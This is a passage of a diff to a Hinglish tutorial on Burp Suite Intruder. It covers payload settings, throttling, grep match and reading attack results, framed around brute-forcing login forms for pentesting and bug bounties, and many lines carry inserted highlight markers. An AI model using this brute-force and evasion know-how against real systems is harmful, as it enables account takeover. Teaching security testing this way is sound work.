-5. **Payload Encoding:** Final payload ko URL-encode karta hai (e.g., space becomes %20). Tum specific characters ko encode se exempt bhi kar sakte ho.
+1. [[HL::**Payload Set:** Attack type ke hisaab se multiple sets allowed. Sniper/Battering ram mein sirf 1 set; Pitchfork/Cluster bomb mein jitne positions utne sets.::HL]]
+2. [[HL::**Payload Type:** Decide karta hai values kaise generate hongi. Simple list sabse common – tum static list dete ho. Brute force – character sets se combinations banata hai. Numbers – range generate karta hai. Dates – date range.::HL]]
+3. [[HL::**Payload Options:** Yahan tum list load karte ho (Load) ya manually entries add karte ho (Add).::HL]]
+4. [[HL::**Payload Processing:** Har payload par operations apply hote hain – jaise hash karna, encode karna, prefix/suffix jodna, match/replace.::HL]]
+5. [[HL::**Payload Encoding:** Final payload ko URL-encode karta hai (e.g., space becomes %20). Tum specific characters ko encode se exempt bhi kar sakte ho::HL]].
 
 ### 💻 7. Hands-On: Step-by-Step Practical:
 **Scenario:** Tum ek login form brute-force kar rahe ho jahan password field base64-encoded expected hai. Tumhe 100 passwords ki list hai.
@@ -3934,10 +3934,10 @@ Payload Encoding
 - **Mistake 4:** Payload processing mein "Add prefix" use kiya lekin prefix mein space ya special character hai jiska URL encoding affect karega. **Fix:** Check encoding.
 
 ### 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier):
-- **"Log sochte hain ki Payloads tab mein sirf simple list hoti hai."**  
-  **Actually:** Payload type ke bahut saare options hain – Brute forcer, Numbers, Dates, etc. Tum inhe bhi use kar sakte ho.
-- **"Log confuse hote hain ki Payload Processing aur Payload Encoding mein kya farak hai."**  
-  **Actually:** Processing payload par transformation apply karta hai **before** final encoding. Encoding final step hai jo payload ko URL-safe banata hai. Pehle processing, phir encoding. Jaise: "admin" -> processing: add prefix "pre_" -> "pre_admin" -> encoding: URL encode if needed.
+- **"[[HL::Log sochte hain ki Payloads tab mein sirf simple list hoti hai."::HL]]**  
+  [[HL::**Actually:** Payload type ke bahut saare options hain – Brute forcer, Numbers, Dates, etc. Tum inhe bhi use kar sakte ho::HL]].
+- **"[[HL::Log confuse hote hain ki Payload Processing aur Payload Encoding mein kya farak hai."::HL]]**  
+  [[HL::**Actually:** Processing payload par transformation apply karta hai **before** final encoding. Encoding final step hai jo payload ko URL-safe banata hai. Pehle processing, phir encoding. Jaise: "admin" -> processing: add prefix "pre_" -> "pre_admin" -> encoding: URL encode if needed::HL]].
 
 ### 🌍 11. Real-World Use Case (Bug Bounty / Pentesting):
 **Scenario:** Ek bug bounty hunter ne ek API endpoint test kiya jahan parameter value ko **MD5 hash** karna required tha. Unhone Payloads tab mein simple list rakhi (usernames), phir Payload Processing mein "Hash" -> "MD5" add kiya.  
@@ -3973,10 +3973,10 @@ Payload Encoding
 ### ❓ 15. FAQ (Interview Questions):
 - **Q1: Payloads tab mein kitne payload sets bana sakte hain?**  
   **A1:** Jitne positions marked hain, utne sets. Sniper/Battering ram mein ek, Pitchfork/Cluster bomb mein multiple.
-- **Q2: Payload type "Brute forcer" kaise kaam karta hai?**  
-  **A2:** Tum character set aur min/max length dete ho. Wo saare possible combinations generate karta hai.
-- **Q3: Payload processing mein "Add prefix" kya hai?**  
-  **A3:** Har payload ke shuru mein ek fixed string jod deta hai. Jaise "user_" prefix se "admin" -> "user_admin".
+- [[HL::**Q2: Payload type "Brute forcer" kaise kaam karta hai?**::HL]]  
+  [[HL::**A2:** Tum character set aur min/max length dete ho. Wo saare possible combinations generate karta hai::HL]].
+- [[HL::**Q3: Payload processing mein "Add prefix" kya hai?**::HL]]  
+  [[HL::**A3:** Har payload ke shuru mein ek fixed string jod deta hai. Jaise "user_" prefix se "admin" -> "user_admin::HL]]".
 - **Q4: Payload encoding ka kya matlab hai?**  
   **A4:** Payload ko URL-safe banane ke liye special characters ko %XX format mein convert karna.
 - **Q5: Kya payload processing multiple steps ho sakti hai?**  
@@ -3995,23 +3995,23 @@ Payload Encoding
 Maano tum machine gun chala rahe ho. Agar ek saath bahut saari goliyaan chhodoge toh gun overheat ho jayegi aur kharab ho sakti hai (ya target server crash ho sakta hai). Isliye tum **firing speed** control karte ho – ek baar mein kitni goliyaan chhoote, aur do goli ke beech kitna gap ho. **Resource Pool** exactly yahi kaam karta hai Intruder mein. Ye server ki capacity ke hisaab se request ki speed set karta hai, taaki server block na kare aur tum safe raho.
 
 ### 📖 3. Technical Definition (Interview Answer):
-Resource Pool Intruder ka ek feature hai jo **network thread pool** ko control karta hai. Tum maximum concurrent requests (ek saath kitni requests parallel bhejni hain) aur delay between requests (do requests ke beech ka time gap) set kar sakte ho. Tum default pool use kar sakte ho ya custom pool bana sakte ho for different attacks.
+[[HL::Resource Pool Intruder ka ek feature hai jo **network thread pool** ko control karta hai. Tum maximum concurrent requests (ek saath kitni requests parallel bhejni hain) aur delay between requests (do requests ke beech ka time gap) set kar sakte ho. Tum default pool use kar sakte ho ya custom pool bana sakte ho for different attacks::HL]].
 
 ### 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-**Problem:** Agar tum bahut tez requests bhejoge (jaise 100 requests per second) toh target server tumhe rate-limit ya IP ban kar sakta hai. Agar server weak hai toh crash bhi ho sakta hai, jo unethical hai.  
-**Solution:** Resource pool se tum speed kam kar sakte ho, delay daal sakte ho, ya concurrent requests limit kar sakte ho. Isse attack **stealthy** aur **safe** ho jata hai. Tum apni machine ki bhi load kam kar sakte ho.
+[[HL::**Problem:** Agar tum bahut tez requests bhejoge (jaise 100 requests per second) toh target server tumhe rate-limit ya IP ban kar sakta hai. Agar server weak hai toh crash bhi ho sakta hai, jo unethical hai.::HL]]  
+[[HL::**Solution:** Resource pool se tum speed kam kar sakte ho, delay daal sakte ho, ya concurrent requests limit kar sakte ho. Isse attack **stealthy** aur **safe** ho jata hai. Tum apni machine ki bhi load kam kar sakte ho::HL]].
 
 ### 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-Resource Pool tab open karoge toh kuch aisa dikhega:
+[[HL::Resource Pool tab open karoge toh kuch aisa dikhega:::HL]]
 ```
-Resource pools
-Use Burp's auto-throttling (recommended)
-   [OR]
-Select from existing pools:
-   [Default] (10 concurrent requests, 0 delay)
-   [CustomPool1] (5 concurrent, 200ms delay)
+[[HL::Resource pools::HL]]
+[[HL::Use Burp's auto-throttling (recommended)::HL]]
+   [[HL::[OR]::HL]]
+[[HL::Select from existing pools:::HL]]
+   [[HL::[Default] (10 concurrent requests, 0 delay)::HL]]
+   [[HL::[CustomPool1] (5 concurrent, 200ms delay)::HL]]
 
-[Add] [Edit] [Remove]
+[[HL::[Add] [Edit] [Remove::HL]]]
 ```
 Agar tum "Add" karoge toh ek window khulega:
 ```
@@ -4022,11 +4022,11 @@ Throttle between requests: [200] milliseconds
 ```
 
 ### ⚙️ 6. Under the Hood (Technical Working):
-1. Burp internally threads ka pool maintain karta hai. Har thread ek request bhej sakta hai.
-2. Jab tum attack start karte ho, Burp is pool se threads allocate karta hai.
-3. "Maximum concurrent requests" decides kitne threads ek saath active ho sakte hain. Agar 5 set kiya, toh ek time par sirf 5 requests parallel jayengi.
-4. "Throttle between requests" har request ke baad ek delay daalta hai (in milliseconds). Ye consecutive requests ke beech ka gap hai, chahe wo ek hi thread se kyun na ho.
-5. Agar auto-throttling use karte ho, Burp dynamically server ke response time ke hisaab se speed adjust karta hai.
+1. [[HL::Burp internally threads ka pool maintain karta hai. Har thread ek request bhej sakta hai.::HL]]
+2. [[HL::Jab tum attack start karte ho, Burp is pool se threads allocate karta hai.::HL]]
+3. [[HL::"Maximum concurrent requests" decides kitne threads ek saath active ho sakte hain. Agar 5 set kiya, toh ek time par sirf 5 requests parallel jayengi::HL]].
+4. "[[HL::Throttle between requests" har request ke baad ek delay daalta hai (in milliseconds). Ye consecutive requests ke beech ka gap hai, chahe wo ek hi thread se kyun na ho.::HL]]
+5. [[HL::Agar auto-throttling use karte ho, Burp dynamically server ke response time ke hisaab se speed adjust karta hai::HL]].
 
 ### 💻 7. Hands-On: Step-by-Step Practical:
 **Scenario:** Tum ek slow server par brute-force kar rahe ho. 1000 requests bhejni hain. Server 5 requests per second se zyada handle nahi kar sakta.
@@ -4067,8 +4067,8 @@ Throttle between requests: [200] milliseconds
 - **Mistake 4:** Custom pool banaya lekin select karna bhool gaye, default pool use hua. **Fix:** Attack start karne se pehle ensure karo ki sahi pool selected hai.
 
 ### 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier):
-- **"Log sochte hain ki concurrent requests ka matlab hai kitni total requests bhejni hain."**  
-  **Actually:** Concurrent requests ka matlab hai **ek time par** kitni requests parallel jaa rahi hain, total nahi.
+- **"[[HL::Log sochte hain ki concurrent requests ka matlab hai kitni total requests bhejni hain."::HL]]**  
+  [[HL::**Actually:** Concurrent requests ka matlab hai **ek time par** kitni requests parallel jaa rahi hain, total nahi::HL]].
 - **"Log confuse hote hain ki throttle delay har request ke beech mein hota hai ya har thread ke beech."**  
   **Actually:** Throttle delay **global** hai – jab ek request finish hoti hai, agli request bhejne se pehle itna wait karta hai, irrespective of thread count. Isse overall rate limit achieve hota hai.
 
@@ -4092,8 +4092,8 @@ Throttle between requests: [200] milliseconds
 ```
 
 ### 🛠️ 13. Best Practices (Pro Tips):
-- **Tip 1:** Pehle server ka response time dekho. Agar slow hai toh concurrent requests kam rakho (1-2) aur throttle 500-1000ms.
-- **Tip 2:** Agar tum bug bounty kar rahe ho, toh hamesha throttle use karo taaki site ko nuisance na ho. Responsible disclosure ka part hai.
+- [[HL::**Tip 1:** Pehle server ka response time dekho. Agar slow hai toh concurrent requests kam rakho (1-2) aur throttle 500-1000ms.::HL]]
+- [[HL::**Tip 2:** Agar tum bug bounty kar rahe ho, toh hamesha throttle use karo taaki site ko nuisance na ho. Responsible disclosure ka part hai::HL]].
 - **Tip 3:** Different attacks ke liye different pools bana lo – fast attack (e.g., directory fuzzing) ke liye high concurrent, slow brute-force ke liye low.
 - **Tip 4:** Auto-throttling ka use tab karo jab tumhe speed optimize karni ho aur server stable ho. Lekin dhyaan rakho, kabhi kabhi auto-throttling bhi aggressive ho sakti hai.
 
@@ -4105,8 +4105,8 @@ Throttle between requests: [200] milliseconds
 ### ❓ 15. FAQ (Interview Questions):
 - **Q1: Resource pool mein "Maximum concurrent requests" kya hai?**  
   **A1:** Ek samay mein kitni requests parallel bheji jayengi. Isse thread count control hota hai.
-- **Q2: Throttle between requests kaise kaam karta hai?**  
-  **A2:** Har request ke baad ek fixed delay daalta hai, chahe multiple threads kyun na ho. Isse overall requests per second limited ho jati hai.
+- [[HL::**Q2: Throttle between requests kaise kaam karta hai?**::HL]]  
+  [[HL::**A2:** Har request ke baad ek fixed delay daalta hai, chahe multiple threads kyun na ho. Isse overall requests per second limited ho jati hai::HL]].
 - **Q3: Auto-throttling vs custom pool – kaunsa better hai?**  
   **A3:** Auto-throttling beginner-friendly hai, custom pool advanced control deta hai.
 - **Q4: Kya multiple attacks ek saath same pool use kar sakte hain?**  
@@ -4127,89 +4127,89 @@ Throttle between requests: [200] milliseconds
 Machine gun mein kuch **advanced features** bhi hote hain – jaise ki agar goli lagne ke baad pata chal jaye ki target hit hua ya nahi (grep match), ya agar gun jam ho jaye toh kya karna hai (error handling), ya fir sirf goli chalao aur response ka wait mat karo (DoS mode). **Options tab** exactly yahi advanced settings provide karta hai Intruder mein.
 
 ### 📖 3. Technical Definition (Interview Answer):
-Options tab Intruder ki settings ko fine-tune karta hai. Isme **Error Handling** (attack mein error aane par kya karna hai), **Attack Results** (requests aur responses ko store karna, DoS mode), **Grep Match** (response mein specific text dhundhna), **Grep Extract** (response se regex ya text extract karna), aur **Redirections** handle karne jaise options hote hain.
+[[HL::Options tab Intruder ki settings ko fine-tune karta hai. Isme **Error Handling** (attack mein error aane par kya karna hai), **Attack Results** (requests aur responses ko store karna, DoS mode), **Grep Match** (response mein specific text dhundhna), **Grep Extract** (response se regex ya text extract karna), aur **Redirections** handle karne jaise options hote hain::HL]].
 
 ### 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-**Problem:** Attack ke time bahut saari requests hoti hain. Tumhe automatically pata karna hota hai ki kaunsa response successful hai. Saath hi agar koi error aaye (network issue) toh attack rukna nahi chahiye. Aur kabhi kabhi tumhe sirf requests bhejni hain, response ki zaroorat nahi (DoS testing).  
-**Solution:** Options tab se tum ye sab control kar sakte ho – successful responses ko highlight karo, errors ko ignore karo, aur unnecessary response storage band karo.
+[[HL::**Problem:** Attack ke time bahut saari requests hoti hain. Tumhe automatically pata karna hota hai ki kaunsa response successful hai. Saath hi agar koi error aaye (network issue) toh attack rukna nahi chahiye. Aur kabhi kabhi tumhe sirf requests bhejni hain, response ki zaroorat nahi (DoS testing).::HL]]  
+[[HL::**Solution:** Options tab se tum ye sab control kar sakte ho – successful responses ko highlight karo, errors ko ignore karo, aur unnecessary response storage band karo::HL]].
 
 ### 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 Options tab open karoge toh kuch sections dikhenge:
 ```
-Request Headers
-   [ ] Update Content-Length header
+[[HL::Request Headers::HL]]
+   [[HL::[ ] Update Content-Length header::HL]]
 
-Request Engine
-   [ ] Retry on network failure
-   [ ] ... etc.
+[[HL::Request Engine::HL]]
+   [[HL::[ ] Retry on network failure::HL]]
+   [[HL::[ ] ... etc.::HL]]
 
-Attack Results
-   ( ) Store requests only
-   ( ) Store requests and responses
-   ( ) Do not store responses (DoS mode)
+[[HL::Attack Results::HL]]
+   [[HL::( ) Store requests only::HL]]
+   [[HL::( ) Store requests and responses::HL]]
+   [[HL::( ) Do not store responses (DoS mode)::HL]]
 
-Grep - Match
-   [Add] [Edit] [Remove]
-   List of strings to match in response
+[[HL::Grep - Match::HL]]
+   [[HL::[Add] [Edit] [Remove]::HL]]
+   [[HL::List of strings to match in response::HL]]
 
-Grep - Extract
-   [Add] [Edit] [Remove]
+[[HL::Grep - Extract::HL]]
+   [[HL::[Add] [Edit] [Remove]::HL]]
 
-Redirections
-   ( ) Follow redirections (always/never/on-site)
-   etc.
+[[HL::Redirections::HL]]
+   [[HL::( ) Follow redirections (always/never/on-site)::HL]]
+   [[HL::etc::HL]].
 ```
 
 ### ⚙️ 6. Under the Hood (Technical Working):
-1. **Error Handling:** Agar network error aata hai (e.g., connection refused), Burp decide karta hai ki retry karna hai ya ignore karna hai.
-2. **Attack Results:** Tum decide kar sakte ho ki requests aur responses ko disk ya memory mein store karna hai ya nahi. DoS mode mein sirf requests bheji jati hain, responses store nahi hote – isse speed badhti hai.
-3. **Grep Match:** Burp har response mein diye gaye strings ko dhundhta hai. Agar match milta hai, to result column mein tick ya match dikhta hai.
-4. **Grep Extract:** Regular expression se specific part of response extract karta hai (e.g., CSRF token).
-5. **Redirections:** Control karta hai ki agar server redirect (3xx) bheje toh Burp follow kare ya nahi.
+1. [[HL::**Error Handling:** Agar network error aata hai (e.g., connection refused), Burp decide karta hai ki retry karna hai ya ignore karna hai.::HL]]
+2. [[HL::**Attack Results:** Tum decide kar sakte ho ki requests aur responses ko disk ya memory mein store karna hai ya nahi. DoS mode mein sirf requests bheji jati hain, responses store nahi hote – isse speed badhti hai.::HL]]
+3. [[HL::**Grep Match:** Burp har response mein diye gaye strings ko dhundhta hai. Agar match milta hai, to result column mein tick ya match dikhta hai.::HL]]
+4. [[HL::**Grep Extract:** Regular expression se specific part of response extract karta hai (e.g., CSRF token).::HL]]
+5. [[HL::**Redirections:** Control karta hai ki agar server redirect (3xx) bheje toh Burp follow kare ya nahi.::HL]]
 
-### 💻 7. Hands-On: Step-by-Step Practical:
-**Scenario:** Tum login brute-force kar rahe ho. Successful login par "Welcome, admin!" message aata hai. Tum chahte ho ki yeh automatically highlight ho.
+#[[HL::## 💻 7. Hands-On: Step-by-Step Practical::HL]]:
+[[HL::**Scenario:** Tum login brute-force kar rahe ho. Successful login par "Welcome, admin!" message aata hai. Tum chahte ho ki yeh automatically highlight ho.::HL]]
 
-**Step 1: Options tab par jao.**
+**[[HL::Step 1: Options tab par jao::HL]].**
 ```text
-- Intruder mein "Options" tab click karo.
+- [[HL::Intruder mein "Options" tab click karo.::HL]]
 ```
-**Step 2: Grep - Match set karo.**
+[[HL::**Step 2: Grep - Match set karo.**::HL]]
 ```text
-- "Grep - Match" section mein "Add" button click karo.
-- Ek chhoti window khulegi. Wahan likho "Welcome," (ya full text "Welcome, admin!").
-- "OK" karo.
+- [[HL::"Grep - Match" section mein "Add" button click karo.::HL]]
+- [[HL::Ek chhoti window khulegi. Wahan likho "Welcome," (ya full text "Welcome, admin!").::HL]]
+- [[HL::"OK" karo.::HL]]
 ```
-**Step 3: Attack Results set karo (optional).**
+[[HL::**Step 3: Attack Results set karo (optional).**::HL]]
 ```text
-- Agar tum responses bhi dekhna chahte ho, toh "Store requests and responses" select rakho. Agar sirf length/match se kaam chal jayega, toh "Store requests only" bhi sufficient hai.
+- [[HL::Agar tum responses bhi dekhna chahte ho, toh "Store requests and responses" select rakho. Agar sirf length/match se kaam chal jayega, toh "Store requests only" bhi sufficient hai.::HL]]
 ```
-**Step 4: Error Handling check karo.**
+**[[HL::Step 4: Error Handling check karo::HL]].**
 ```text
-- "Retry on network failure" check kar lo, taaki agar koi request fail ho to dubara try ho.
+- "[[HL::Retry on network failure" check kar lo, taaki agar koi request fail ho to dubara try ho.::HL]]
 ```
-**Step 5: Attack start karo.**
+**[[HL::Step 5: Attack start karo::HL]].**
 ```text
-- Attack window mein ek naya column dikhega "Grep Match" jisme tick (✓) hoga jahan "Welcome," match hua.
+- [[HL::Attack window mein ek naya column dikhega "Grep Match" jisme tick (✓) hoga jahan "Welcome," match hua::HL]].
 ```
 
 ### ⚖️ 8. Comparison (Grep Match vs Grep Extract):
-| Feature | Grep Match | Grep Extract |
-|---------|------------|--------------|
-| **Purpose** | Check if a string exists in response | Extract specific part of response (e.g., token) |
-| **Output** | Boolean (Yes/No) in results table | Extracted value in a new column |
-| **Configuration** | Simple string(s) | Regex with capture group |
-| **Use Case** | Identifying success/failure messages | Extracting dynamic values (CSRF token, error messages) |
+| [[HL::Feature | Grep Match | Grep Extract |::HL]]
+[[HL::|---------|------------|--------------|::HL]]
+[[HL::| **Purpose** | Check if a string exists in response | Extract specific part of response (e.g., token) |::HL]]
+[[HL::| **Output** | Boolean (Yes/No) in results table | Extracted value in a new column |::HL]]
+[[HL::| **Configuration** | Simple string(s) | Regex with capture group |::HL]]
+[[HL::| **Use Case** | Identifying success/failure messages | Extracting dynamic values (CSRF token, error messages::HL]]) |
 
 ### 🚫 9. Common Mistakes (Beginner Traps):
-- **Mistake 1:** Grep Match mein string bahut generic di (e.g., "error"), jisse har response mein match mil gaya. **Fix:** Specific string do jo sirf successful response mein aati ho.
-- **Mistake 2:** Attack Results mein "Do not store responses" (DoS mode) select kar liya aur phir response analyze nahi kar paaye. **Fix:** Sirf tab use karo jab tumhe response ki zaroorat nahi (e.g., load testing).
+- [[HL::**Mistake 1:** Grep Match mein string bahut generic di (e.g., "error"), jisse har response mein match mil gaya. **Fix:** Specific string do jo sirf successful response mein aati ho::HL]].
+- [[HL::**Mistake 2:** Attack Results mein "Do not store responses" (DoS mode) select kar liya aur phir response analyze nahi kar paaye. **Fix:** Sirf tab use karo jab tumhe response ki zaroorat nahi (e.g., load testing::HL]]).
 - **Mistake 3:** Redirections follow nahi ki, jabki successful login redirect karta hai, to response mein match nahi mila. **Fix:** "Follow redirections" always ya on-site set karo.
 - **Mistake 4:** Error Handling mein retry enable kiya, lekin network failure par baar-baar retry ho raha hai, attack slow ho raha hai. **Fix:** Retry count limit nahi hai, isliye manual intervention better hai.
 
 ### 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier):
-- **"Log sochte hain ki Grep Match sirf response body mein dhundhta hai."**  
-  **Actually:** Grep Match response headers mein bhi dhundh sakta hai, depending on configuration. Lekin by default body mein.
+- **"[[HL::Log sochte hain ki Grep Match sirf response body mein dhundhta hai."::HL]]**  
+  [[HL::**Actually:** Grep Match response headers mein bhi dhundh sakta hai, depending on configuration. Lekin by default body mein::HL]].
 - **"Log confuse hote hain ki DoS mode ka matlab server par DoS attack karna hai."**  
   **Actually:** DoS mode sirf Burp ke internal behavior ko refer karta hai – responses store nahi hote, isliye faster. Iska matlab nahi ki tum DoS attack kar rahe ho. Tum phir bhi speed control kar sakte ho.
 
@@ -4234,7 +4234,7 @@ Redirections
 ```
 
 ### 🛠️ 13. Best Practices (Pro Tips):
-- **Tip 1:** Grep Match ke liye multiple strings add kar sakte ho – jaise "Welcome", "Dashboard", "Logout". Ek hi column mein sab ke results aate hain.
+- [[HL::**Tip 1:** Grep Match ke liye multiple strings add kar sakte ho – jaise "Welcome", "Dashboard", "Logout". Ek hi column mein sab ke results aate hain::HL]].
 - **Tip 2:** Grep Extract ke liye regex carefully test karo. Pehle Repeater mein response copy karo aur regex test karo.
 - **Tip 3:** Agar tum large attack kar rahe ho, toh "Store requests only" select karo – memory bachegi.
 - **Tip 4:** Redirections follow karne se tum login ke baad ke pages bhi dekh sakte ho, lekin dhyan rakho ki follow karne se extra requests bhi ho sakti hain.
@@ -4245,16 +4245,16 @@ Redirections
 - **Scenario 3:** Redirections follow nahi ki, to successful login ke baad ka response nahi dekha, aur match nahi mila.
 
 ### ❓ 15. FAQ (Interview Questions):
-- **Q1: Options tab mein "Grep Match" ka kya kaam hai?**  
-  **A1:** Response mein specific text dhundhkar result column mein show karna, taake successful requests easily identify ho.
+- [[HL::**Q1: Options tab mein "Grep Match" ka kya kaam hai?**::HL]]  
+  [[HL::**A1:** Response mein specific text dhundhkar result column mein show karna, taake successful requests easily identify ho::HL]].
 - **Q2: "DoS mode" kya hai?**  
   **A2:** Attack Results mein ek option hai jisme responses store nahi hote, sirf requests bheji jati hain. Isse attack speed badhti hai, par analysis ke liye responses nahi milte.
 - **Q3: Error handling mein "Retry on network failure" ka kya matlab?**  
   **A3:** Agar kisi request mein network error aata hai (e.g., timeout), to Burp automatically us request ko dubara bhejega.
 - **Q4: Grep Extract kaise configure karte hain?**  
   **A4:** Tum regex do with capture group, jaise `Name: (.*)` se value extract ho jayegi.
-- **Q5: Kya Options tab ki settings saare attacks ke liye common hoti hain?**  
-  **A5:** Nahi, har Intruder tab (ya attack window) ki apni options hoti hain. Jab tum "Start attack" karte ho to jo options tab mein set hai woh us attack ke liye apply hoti hain.
+- [[HL::**Q5: Kya Options tab ki settings saare attacks ke liye common hoti hain?**::HL]]  
+  [[HL::**A5:** Nahi, har Intruder tab (ya attack window) ki apni options hoti hain. Jab tum "Start attack" karte ho to jo options tab mein set hai woh us attack ke liye apply hoti hain::HL]].
 
 ### 📝 16. Ek Line Mein Yaad Rakhne Ko (Summary):
 "Options Tab woh advanced settings hai jo attack ko smart banata hai – errors handle karo, responses mein dhundho, aur speed optimize karo."
@@ -4269,11 +4269,11 @@ Redirections
 Machine gun chala di, ab pata kaise chalega ki goli kahan lagi? Tum target ko dekhte ho – agar wo gir gaya toh samjho goli lagi. Yahan bhi aisa hi hai. **Start Attack** button dabane ke baad ek naya window khulta hai jisme **results table** dikhti hai. Har row ek request hai. Tum **status code** (jaise 200 OK = mil gaya, 404 = nahi mila), **response length** (badla ya nahi), aur **grep match** column dekh kar pata lagate ho ki kaunsa payload successful hai. Kuch responses pe click karke poori request/response bhi dekh sakte ho.
 
 ### 📖 3. Technical Definition (Interview Answer):
-Intruder attack start karne par ek **attack results window** open hoti hai. Isme ek table hota hai jisme har row ek request represent karti hai, jisme columns hote hain: request number, payload(s), status code, response length, time, aur grep match/extracted values. Tum kisi bhi row par click kar ke uski raw request aur response dekh sakte ho. Isi window mein tum results filter aur sort kar sakte ho, aur successful entries identify kar sakte ho.
+[[HL::Intruder attack start karne par ek **attack results window** open hoti hai. Isme ek table hota hai jisme har row ek request represent karti hai, jisme columns hote hain: request number, payload(s), status code, response length, time, aur grep match/extracted values. Tum kisi bhi row par click kar ke uski raw request aur response dekh sakte ho. Isi window mein tum results filter aur sort kar sakte ho, aur successful entries identify kar sakte ho::HL]].
 
 ### 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-**Problem:** Hazaaron requests bhej di, ab manually kaise pata chalega ki kaunsa sahi tha?  
-**Solution:** Attack results window automatically sab kuch organize karta hai. Tum status code (200 OK vs 401 Unauthorized) dekh kar, length compare kar ke, ya grep match column dekh ke seconds mein successful hit find kar sakte ho. Response dekh kar confirm kar sakte ho.
+[[HL::**Problem:** Hazaaron requests bhej di, ab manually kaise pata chalega ki kaunsa sahi tha?::HL]]  
+[[HL::**Solution:** Attack results window automatically sab kuch organize karta hai. Tum status code (200 OK vs 401 Unauthorized) dekh kar, length compare kar ke, ya grep match column dekh ke seconds mein successful hit find kar sakte ho. Response dekh kar confirm kar sakte ho::HL]].
 
 ### 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 Attack start karne par ek naya window khulega:
@@ -4308,15 +4308,15 @@ Neeche do panels: request aur response. Kisi row par click karoge to uski reques
 ```
 **Step 3: Successful hit dhundho.**
 ```text
-- Agar tumne grep match set kiya hai, toh "Grep Match" column mein tick (match) aayega successful ones mein.
-- Ya phir length column par click karo to sort by length. Aksar successful response ki length different hoti hai (e.g., 3456 vs 1200).
-- Status code dekho – 200 OK usually successful, 302 redirect bhi successful ho sakta hai (login ke baad redirect).
+- [[HL::Agar tumne grep match set kiya hai, toh "Grep Match" column mein tick (match) aayega successful ones mein.::HL]]
+- [[HL::Ya phir length column par click karo to sort by length. Aksar successful response ki length different hoti hai (e.g., 3456 vs 1200).::HL]]
+- [[HL::Status code dekho – 200 OK usually successful, 302 redirect bhi successful ho sakta hai (login ke baad redirect::HL]]).
 ```
-**Step 4: Response verify karo.**
+[[HL::**Step 4: Response verify karo.**::HL]]
 ```text
-- Jis row par match dikhe, us par click karo.
-- Neeche "Response" tab mein poora response dikhega. Check karo ki "Welcome" ya "Dashboard" jaise keywords hain.
-- Confirm kar lo ki ye successful login hai.
+- [[HL::Jis row par match dikhe, us par click karo.::HL]]
+- [[HL::Neeche "Response" tab mein poora response dikhega. Check karo ki "Welcome" ya "Dashboard" jaise keywords hain.::HL]]
+- [[HL::Confirm kar lo ki ye successful login hai::HL]].
 ```
 **Step 5: Save/export results.**
 ```text
@@ -4336,7 +4336,7 @@ Response mein dikhega: "Location: /dashboard" aur "Welcome, admin!"
 | **Grep Match** | Specific text dhundhna | Very High | Sabse reliable, lekin text pata hona chahiye |
 
 ### 🚫 9. Common Mistakes (Beginner Traps):
-- **Mistake 1:** Sirf status code 200 ko successful maan liya, lekin login successful hone par 302 redirect aaya. **Fix:** 302 ko bhi consider karo, aur grep match use karo.
+- [[HL::**Mistake 1:** Sirf status code 200 ko successful maan liya, lekin login successful hone par 302 redirect aaya. **Fix:** 302 ko bhi consider karo, aur grep match use karo::HL]].
 - **Mistake 2:** Length column sort karke sabse chhoti length wali row ko successful maan liya, lekin galat response bhi chhoti length ho sakti hai (e.g., error page). **Fix:** Response check karo.
 - **Mistake 3:** Grep match set nahi kiya aur hazaaro rows manually scroll kiye. **Fix:** Hamesha grep match set karo.
 - **Mistake 4:** Attack window band kar diya bina results save kiye. **Fix:** Save table option use karo.
@@ -4369,10 +4369,10 @@ Response mein dikhega: "Location: /dashboard" aur "Welcome, admin!"
 ```
 
 ### 🛠️ 13. Best Practices (Pro Tips):
-- **Tip 1:** Attack ke baad table ko **sort by length** karo – often successful response different length ka hota hai.
-- **Tip 2:** **Filter** option use karo (right-click table → Filter) – sirf grep match wali rows dikhao.
-- **Tip 3:** Agar multiple payload sets hain, toh payload columns separate hote hain. Unhe sort bhi kar sakte ho.
-- **Tip 4:** Attack window mein "Columns" right-click kar ke customize kar sakte ho – extra fields add/remove.
+- [[HL::**Tip 1:** Attack ke baad table ko **sort by length** karo – often successful response different length ka hota hai.::HL]]
+- [[HL::**Tip 2:** **Filter** option use karo (right-click table → Filter) – sirf grep match wali rows dikhao.::HL]]
+- [[HL::**Tip 3:** Agar multiple payload sets hain, toh payload columns separate hote hain. Unhe sort bhi kar sakte ho.::HL]]
+- [[HL::**Tip 4:** Attack window mein "Columns" right-click kar ke customize kar sakte ho – extra fields add/remove::HL]].
 
 ### ⚠️ 14. Consequences of Failure (Agar galat kiya toh?):
 - **Scenario 1:** Tumne galat payload list use ki, toh saare responses fail honge. Lekin analysis sahi kiya toh pata chal jayega ki kuch nahi mila.
@@ -4382,8 +4382,8 @@ Response mein dikhega: "Location: /dashboard" aur "Welcome, admin!"
 ### ❓ 15. FAQ (Interview Questions):
 - **Q1: Attack results window mein kaunse columns hote hain?**  
   **A1:** Request number, payload values, status code, response length, comment, grep match, grep extract, etc.
-- **Q2: Length column se successful request kaise identify karein?**  
-  **A2:** Aksar successful response ki length galat response se different hoti hai. Sort karke dekho outliers.
+- [[HL::**Q2: Length column se successful request kaise identify karein?**::HL]]  
+  [[HL::**A2:** Aksar successful response ki length galat response se different hoti hai. Sort karke dekho outliers::HL]].
 - **Q3: Kya hum attack chalte hue results filter kar sakte hain?**  
   **A3:** Haan, table ke upar filter option hai. Tum sirf match wale rows dikhane ke liye filter laga sakte ho.
 - **Q4: Attack results save kaise karein?**  
@@ -4413,79 +4413,79 @@ Response mein dikhega: "Location: /dashboard" aur "Welcome, admin!"
 Socho tum ek **scientist** ho. Tumhe koi chemical reaction baar-baar test karna hai, thoda thoda change karke. Tum ek sample chemical lab mein le jaate ho aur apni **test tube** (request) ko **repeater** (experiment setup) mein rakhte ho. Burp Suite mein **Repeater** woh jagah hai jahan tum kisi bhi request ko bhej kar baar-baar modify kar ke uska response dekh sakte ho. Jaise scientist sample ko machine mein rakh kar experiment shuru karta hai.
 
 ### 📖 3. Technical Definition (Interview Answer):
